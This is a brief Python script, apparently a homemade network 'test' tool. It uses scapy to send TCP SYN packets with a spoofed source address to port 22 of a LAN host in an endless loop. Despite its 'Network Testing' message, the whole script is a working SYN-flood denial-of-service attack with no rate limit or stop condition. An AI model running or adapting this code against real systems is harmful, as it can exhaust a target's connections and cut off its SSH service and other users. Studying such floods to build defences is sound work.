from scapy.all import *

i = IP()
i.dst="192.168.0.104"
i.src="192.168.0.105"

t = TCP()
t.dport = 22
t.sport = RandShort()
t.flags = "S"

send(i/t/"Network Testing begin in 3 seconds...")
time.sleep(3)
while True:
	send(i/t)
